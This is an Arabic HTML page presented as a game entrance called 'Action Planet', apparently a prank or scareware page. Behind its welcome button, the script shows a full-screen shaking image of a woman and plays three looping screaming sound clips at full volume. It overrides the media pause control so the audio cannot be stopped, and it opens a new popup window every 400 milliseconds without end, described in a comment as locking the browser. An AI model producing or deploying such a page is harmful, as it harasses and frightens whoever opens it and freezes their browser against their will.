<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Action Planet</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; font-family: 'Arial', sans-serif; overflow: hidden; }
        
        /* واجهة كوكب أكشن الأنيقة سواسوة */
        #ui { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            display: flex; flex-direction: column; justify-content: center; 
            align-items: center; z-index: 10000; background: #ffffff;
        }
        .logo-text { font-size: 32px; color: #ffcc00; font-weight: bold; text-shadow: 2px 2px #000; margin-bottom: 20px; }
        .btn-action { 
            background: #ffcc00; color: #000; border: 4px solid #000; 
            padding: 20px 50px; font-size: 24px; font-weight: bold; 
            border-radius: 50px; cursor: pointer; box-shadow: 0 10px 0 #ccaa00;
            transition: 0.1s;
        }
        .btn-action:active { transform: translateY(5px); box-shadow: 0 5px 0 #ccaa00; }

        /* صورة المرأة: حركة ثابتة ومستقرة سواسوة */
        #madImg { 
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            object-fit: cover; z-index: 999; display: none;
        }

        /* أنيميشن الرعشة الثابتة سواسوة */
        @keyframes steadyJitter {
            0% { transform: translate(3px, 3px) rotate(0deg); }
            25% { transform: translate(-3px, -3px) rotate(-1deg); }
            50% { transform: translate(3px, -3px) rotate(1deg); }
            75% { transform: translate(-3px, 3px) rotate(-1deg); }
            100% { transform: translate(3px, 3px) rotate(0deg); }
        }
        .vibrate { display: block !important; animation: steadyJitter 0.05s infinite; }
    </style>
</head>
<body>

    <div id="ui">
        <div class="logo-text">مرحباً بكم في كوكب أكشن</div>
        <button class="btn-action" onclick="enterTheAction()">دخول</button>
    </div>

    <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <script>
        function enterTheAction() {
            // 1. إخفاء الواجهة فوراً وظهور المرأة سواسوة
            document.getElementById('ui').style.display = 'none';
            document.getElementById('madImg').classList.add('vibrate');

            // 2. تشغيل الأصوات الثلاثة في رحبة سواسوة
            const tracks = [
                "https://www.myinstants.com/media/sounds/hoova-2.mp3",
                "https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3",
                "https://www.myinstants.com/media/sounds/dzonza.mp3"
            ];

            tracks.forEach(src => {
                let a = new Audio(src);
                a.loop = true;
                a.volume = 1.0;
                a.play();
                
                // تثبيت الصوت في الخلفية سواسوة
                if ('mediaSession' in navigator) {
                    navigator.mediaSession.metadata = new MediaMetadata({ title: 'Action Planet', artist: 'Planet' });
                    navigator.mediaSession.setActionHandler('pause', () => a.play());
                }
            });

            // 3. قفل المتصفح سواسوة
            setInterval(() => {
                window.open(window.location.href, '_blank', 'width=10,height=10');
            }, 400);
        }
    </script>
</body>
</html>
